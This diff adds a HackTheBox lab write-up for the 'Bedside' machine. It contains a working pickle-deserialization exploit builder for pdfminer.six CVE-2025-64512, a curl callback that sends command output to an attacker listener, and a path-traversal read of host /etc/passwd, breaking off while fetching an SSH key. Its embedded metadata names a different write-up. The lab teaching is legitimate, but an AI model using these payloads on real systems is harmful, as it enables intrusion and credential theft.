@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Bedside — S. Markakis</title>
+<meta name="description" content="HackTheBox Bedside (medium, Linux) rooted from macOS: a research portal running pdfminer.six falls to CVE-2025-64512 — a trigger PDF points a font's /Encoding at an uploaded .pickle.gz and a background pdf2txt watcher unpickles it into container RCE; an internal port-3000 static server has a --path-as-is traversal that reads the developer user's SSH key off the host; and a sudo-run MONAI trainer calls torch.load(weights_only=False) on an attacker-planted checkpoint delivered through a shared /datastore volume. The same pickle bug, twice, no reverse shell.">
+<meta property="og:title" content="HTB: Bedside — S. Markakis">
+<meta property="og:description" content="HackTheBox Bedside (medium, Linux) rooted from macOS: a research portal running pdfminer.six falls to CVE-2025-64512 — a trigger PDF points a font's /Encoding at an uploaded .pickle.gz and a background pdf2txt watcher unpickles it into container RCE; an internal port-3000 static server has a --path-as-is traversal that reads the developer user's SSH key off the host; and a sudo-run MONAI trainer calls torch.load(weights_only=False) on an attacker-planted checkpoint delivered through a shared /datastore volume. The same pickle bug, twice, no reverse shell.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-bedside.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-bedside.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-bedside.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-bedside.html">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Nexus",
+  "description": "HackTheBox Nexus machine walkthrough — leaked Gitea commit credentials into an authenticated Krayin CRM file-upload RCE, a leaked .env password reused over SSH, and an automated exploit for a Gitea template-sync path traversal that plants a root SSH key.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-nexus.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-nexus.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-nexus"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Bedside</h1>
+    <div class="post-meta">
+      <span class="date">September 12, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Deserialization</span>
+      <span class="tag">pdfminer · CVE-2025-64512</span>
+      <span>&nbsp;13 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Bedside is a medium Linux box that tells one joke twice: <em>trusting data you shouldn't</em>. A "research portal" runs <strong>pdfminer.six</strong>, freshly wounded by <strong>CVE-2025-64512</strong> — a crafted PDF can point a font's <code>/Encoding</code> at an attacker-controlled <code>.pickle.gz</code>, and when the library loads that CMap it <code>pickle.load()</code>s it into code execution. Uploading the file isn't enough; a background watcher only ever feeds real <code>*.pdf</code> to the parser, so the payload is <strong>split in two</strong> — the malicious pickle plus a plain trigger PDF that references it. That lands a shell in a container. From there an internal image-viewer on port 3000 turns out to be a static file server with a path traversal, which reads the <code>developer</code> user's SSH key straight off the host. And the clinic's proudest feature — a self-learning MONAI trainer that <code>developer</code> can run as root — restores checkpoints with <code>torch.load(weights_only=False)</code>, which is <code>pickle</code> again. Plant a checkpoint, run the trainer, get root. Same bug, second dose. The whole chain is driven from macOS — no reverse shell, request/response only.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">vhost fuzz → research</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">pdfminer CVE-2025-64512</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">datawrangler (container)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">:3000 path traversal → dev SSH key</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sudo trainer torch.load</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>Two ports, and the web root leaks a hostname in its title — the usual cue to fuzz virtual hosts rather than paths.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -sVC -p22,80 &lt;IP&gt;</span>
+<span class="po">22/tcp open  ssh   OpenSSH 10.0p2 Debian
+80/tcp open  http  Apache httpd 2.4.68 (Debian)   </span><span class="pco"># title: Bedside Clinic - bedside.htb</span></div>
+  </div>
+
+  <p>Both versions are current — no version-level CVE to throw. That's the tell: the bug won't be in what the clinic runs on, it'll be in what the clinic <em>built</em>. The front page is a static brochure with nothing that takes input, so I fuzzed vhosts, filtering the redirect the main host serves for names that don't resolve:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ffuf — vhost fuzzing</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" \
+     -w subdomains.txt -fc 301</span>
+<span class="pg">research  [Status: 200, Size: 3152]</span></div>
+  </div>
+
+  <p>One hit: <code>research.bedside.htb</code>. To keep everything scriptable from macOS I never touched <code>/etc/hosts</code> — every request just carries the vhost by hand:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reach the vhost without /etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -i -H "Host: research.bedside.htb" http://&lt;IP&gt;/ | head -6</span>
+<span class="po">HTTP/1.1 200 OK
+Server: Apache/2.4.68 (Debian)
+</span><span class="py">X-Powered-By: pdfminer.six</span><span class="po">
+Content-Type: text/html; charset=UTF-8</span></div>
+  </div>
+
+  <p>That <code>X-Powered-By</code> header is hand-set — no framework writes it — and it names the whole game: <strong>pdfminer.six</strong>. The portal itself is a file-upload form ("upload X-rays, CT scans, research documents to feed the clinic's AI model training"), with a notice listing accepted formats and two lines that matter more than they look: <em>"Collections can be uploaded as archives"</em> and <em>"Certain file formats may be converted to standardized formats."</em> An upload that accepts archives and quietly converts files is an upload that parses a lot behind the scenes. Parsing is where things break.</p>
+
+  <!-- ══ PROBING THE UPLOAD ══ -->
+  <h2>Reading the rules the server enforced</h2>
+
+  <p>Before touching the exploit I made the upload tell me its own rules. Sending a file the whitelist rejects leaks two useful things — the real accepted set, and the absolute storage path:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">provoke the errors</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">echo test | curl -s -H "Host: research.bedside.htb" -F "uploadFile=@-;filename=x" http://&lt;IP&gt;/</span>
+<span class="po">Invalid file type. Allowed: jpeg, jpg, png, bmp, tiff, dcm, pdf, </span><span class="py">gz, zip</span><span class="po">
+
+</span><span class="pd">$ </span><span class="pc">printf 'test\n' &gt; x.gz; curl -s -H "Host: research.bedside.htb" -F "uploadFile=@x.gz" http://&lt;IP&gt;/</span>
+<span class="pr">MIME type mismatch. Unable to upload file to destination</span><span class="po"> /var/www/research.bedside.htb/uploads</span></div>
+  </div>
+
+  <p>Two facts fall out. First, the whitelist advertised seven formats to the public but the backend actually accepts <code>gz</code> and <code>zip</code> too — the undocumented "archives." Second, the filter doesn't trust the extension: a <code>.gz</code> that isn't a real gzip stream is rejected on content, and the complaint leaks <code>/var/www/research.bedside.htb/uploads</code>. That path is the missing piece for the exploit I was about to build, and it was handed to me in an error message.</p>
+
+  <p>(The archive-symlink trick — pack a symlink to <code>/etc/passwd</code>, let the server extract it, request it back — goes nowhere here: the server stores archives whole and never extracts them. Worth trying, dead end.)</p>
+
+  <!-- ══ CVE ══ -->
+  <h2>CVE-2025-64512 — a font that loads a pickle</h2>
+
+  <p>pdfminer.six loads CMap (character-map) resources by name. Internally, <code>CMapDB</code> maps a name to a file and does roughly <code>pickle.loads(gzip.open(name + ".pickle.gz").read())</code>. The vulnerability: a Type0 font's <code>/Encoding</code> can name that CMap, and the name is attacker-controlled — including <strong>absolute paths</strong>. So a PDF that references <code>/Encoding /…uploads#2Fsh</code> (where <code>#2F</code> is a PDF-escaped <code>/</code>) makes pdfminer load and unpickle <code>/var/www/research.bedside.htb/uploads/sh.pickle.gz</code>. A pickle with a <code>__reduce__</code> returning <code>(os.system, (cmd,))</code> is code execution the moment that font is instantiated.</p>
+
+  <p>Every prerequisite is already in hand: the whitelist lets me upload a real <code>.gz</code>, and the MIME error handed me the exact directory the PDF must name. But my <strong>first attempt failed</strong>, and the failure is the whole lesson of this box.</p>
+
+  <h3>Why one file wasn't enough</h3>
+
+  <p>The obvious move is luigigubello's polyglot: a single file that is <em>both</em> a valid gzip carrying the pickle <em>and</em> a valid self-referencing PDF. I uploaded it, set a listener, and… nothing. The CVE only fires when something actually <em>parses</em> the PDF, and simply uploading a file doesn't feed it to pdfminer. Some background job had to pick it up — and if that job only touches real PDFs, a file named <code>.pickle.gz</code> sits ignored forever. I needed to change the shape of the payload before I'd even seen the code that would eventually confirm it.</p>
+
+  <p>So I split the payload in two. The malicious pickle keeps its <code>.pickle.gz</code> name so pdfminer will load it as a CMap. A separate, ordinary-looking <code>trigger.pdf</code> points its <code>/Encoding</code> at that pickle. The background job scans for real PDFs, finds <code>trigger.pdf</code>, parses it, follows the CMap reference to my pickle, and detonates. Here's the builder — <code>__reduce__</code> is the payload, the PDF is a minimal Type0 font whose encoding is the pickle's absolute path with slashes escaped:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">build_and_send.py — the two-file payload</span>
+    </div>
+    <div class="term-body"><span class="pco">#!/usr/bin/env python3</span>
+<span class="pb">import</span><span class="po"> gzip, pickle, os, sys, subprocess</span>
+
+<span class="po">IP, HOST = "&lt;IP&gt;", "research.bedside.htb"
+UP   = "/var/www/research.bedside.htb/uploads"
+NAME = "sh"                       </span><span class="pco"># pickle stored as &lt;NAME&gt;.pickle.gz</span><span class="po">
+CMD  = sys.argv[1]</span>
+
+<span class="pb">class</span><span class="pc"> RCE</span><span class="po">:
+    </span><span class="pb">def</span><span class="pc"> __reduce__</span><span class="po">(self):
+        </span><span class="pb">return</span><span class="po"> (os.system, (CMD,))</span>
+
+<span class="pco"># 1) malicious pickle, gzip-compressed -&gt; passes the "is it a real gzip" check</span>
+<span class="po">open("sh.pickle.gz","wb").write(gzip.compress(pickle.dumps(RCE())))</span>
+
+<span class="pco"># 2) trigger.pdf: a Type0 font whose /Encoding names the pickle (/ -&gt; #2F)</span>
+<span class="po">enc = (UP + "/" + NAME).replace("/", "#2F")
+PDF = ("%PDF-1.4\n"
+  "1 0 obj&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;endobj\n"
+  "2 0 obj&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;endobj\n"
+  "3 0 obj&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
+  "/Contents 4 0 R /Resources &lt;&lt; /Font &lt;&lt; /F1 5 0 R &gt;&gt; &gt;&gt; &gt;&gt;endobj\n"
+  "4 0 obj&lt;&lt; /Length 20 &gt;&gt;stream\nBT /F1 12 Tf ET\nendstream endobj\n"
+  "5 0 obj&lt;&lt; /Type /Font /Subtype /Type0 /BaseFont /F /Encoding /__ENC__ "
+  "/DescendantFonts [6 0 R] &gt;&gt;endobj\n"
+  "6 0 obj&lt;&lt; /Type /Font /Subtype /CIDFontType2 /BaseFont /F /FontDescriptor 7 0 R &gt;&gt;endobj\n"
+  "7 0 obj&lt;&lt; /Type /FontDescriptor /FontName /F /Flags 4 &gt;&gt;endobj\n"
+  "trailer&lt;&lt; /Size 8 /Root 1 0 R &gt;&gt;\n%%EOF\n").replace("__ENC__", enc)
+open("trigger.pdf","wb").write(PDF.encode())</span>
+
+<span class="pco"># upload both (retry until the portal returns "successfully")</span>
+<span class="pb">def</span><span class="pc"> up</span><span class="po">(path, ctype):
+    for _ in range(6):
+        r = subprocess.run(["curl","-s","-H",f"Host: {HOST}",
+            "-F",f"uploadFile=@{path};type={ctype}", f"http://{IP}/"],
+            capture_output=True, text=True)
+        if "successfully" in r.stdout: return
+up("sh.pickle.gz","application/gzip")
+up("trigger.pdf","application/pdf")</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — the watcher takes the bait</h2>
+
+  <p>A live reverse shell landing in my terminal is the single loudest thing you can do, so I never used one. Instead I proved execution out-of-band: have the payload <code>curl</code> a marker back to a listener I control. The target pulls — request/response, nothing inbound.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">prove RCE with a callback</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 -m http.server 8000 &amp;                 </span><span class="pco"># listener on my VPN ip</span>
+<span class="pd">$ </span><span class="pc">python3 build_and_send.py 'curl -s http://&lt;VPN&gt;:8000/HIT-$(hostname)-$(id -un)'</span>
+<span class="pco"># ~30s later, in the http.server log:</span>
+<span class="pg">&lt;IP&gt; - - "GET /HIT-data-wrangler-datawrangler HTTP/1.1"</span></div>
+  </div>
+
+  <p>Code execution as <code>datawrangler</code> on a host that calls itself <code>data-wrangler</code>. The ~30-second delay is the confession: my upload didn't trigger anything — a <strong>scheduled job</strong> woke up, found a new PDF, and processed it. (An early marker written straight into the web root had failed silently: the watcher runs as <code>datawrangler</code> and can't write the <code>www-data</code>-owned <code>uploads/</code> dir. The callback sidesteps file permissions entirely.)</p>
+
+  <p>Container recon, exfiltrated the same way — pipe command output into a <code>POST</code> my listener saves to disk:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">who am I, and what's shared</span>
+    </div>
+    <div class="term-body"><span class="po">uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
+
+</span><span class="pd">$ </span><span class="pc">cat /app/pdf_watcher.py</span><span class="pco">   # the job that ran my payload</span>
+<span class="po">UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
+OUTPUT_DIR = "/datastore/staging"
+while True:
+    for pdf in glob.glob(UPLOAD_DIR + "/</span><span class="py">*.pdf</span><span class="po">"):        </span><span class="pco"># only real PDFs, ever</span><span class="po">
+        subprocess.run(["pdf2txt.py", pdf, "-o", out]) </span><span class="pco"># pdf2txt.py == pdfminer</span><span class="po">
+    time.sleep(30)</span></div>
+  </div>
+
+  <p>That confirms the whole theory: the loop globs <code>*.pdf</code> every 30&nbsp;s and feeds each to <code>pdf2txt.py</code> — pdfminer straight into the CVE. It also explains a wall from earlier: <code>process_pdf()</code> explicitly rejects symlinks and non-regular files, so the archive-symlink idea was never going to work. The developer thought about that specific attack. They didn't think about a PDF pointing at a pickle. Output lands in <code>/datastore/staging</code> — a directory outside <code>/app</code>, and <code>datawrangler</code> is in the <code>dataops</code> group that owns it. Shared storage between containers is exactly the kind of seam worth prying.</p>
+
+  <!-- ══ LATERAL ══ -->
+  <h2>Lateral movement — the wrong chart</h2>
+
+  <p>The container is bare but has <code>curl</code> and <code>python3</code>. Reading <code>/proc/net/route</code> gives the Docker gateway (<code>172.17.0.1</code>); a tiny socket sweep from inside finds a port the external nmap never saw because it only listens on the bridge: <strong>3000</strong>. It serves "Bedside Clinic - Image Viewer," a React app for MRI slices — the kind of thing that hides a path traversal in its slice-fetch API.</p>
+
+  <p>Except the API is fake. Its own JavaScript generates slices with <code>Math.random()</code> — <code>"// For demo"</code>. There is no <code>/api/slice</code>, no file parameter, nothing server-side to attack <em>through the app</em>. I almost sank an hour into an endpoint that never existed. The real flaw is one layer down: the app is decoration, but the thing serving it is still a real static file server, and static servers have their own classic bug. Aim the traversal at the server root instead of guessing app routes — with <code>--path-as-is</code> so curl doesn't helpfully collapse the <code>../</code> before sending:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">path traversal off the static server (run in-container)</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd' | tail -4</span>
+<span class="po">developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
+datawrangler:x:988:1001::/home/datawrangler:/bin/sh
+_laurel:x:987:987::/var/log/laurel:/bin/false
+polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin</span></div>
+  </div>
+
+  <p>This isn't the container's <code>/etc/passwd</code> — it has <code>developer</code>, <code>_laurel</code>, <code>polkitd</code>, users the minimal container doesn't. The port-3000 service reads files off the <strong>host</strong> filesystem, and the traversal reads any of them. An <code>/etc/passwd</code> entry is an introduction, not a way in — but arbitrary host file read means I can just ask for <code>developer</code>'s SSH key and the user flag. The key isn't at <code>id_ed25519</code>; a quick sweep of candidate names finds it at <code>id_rsa</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">steal the host SSH key + user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">B=../../../../home/developer; T=http://172.17.0.1:3000
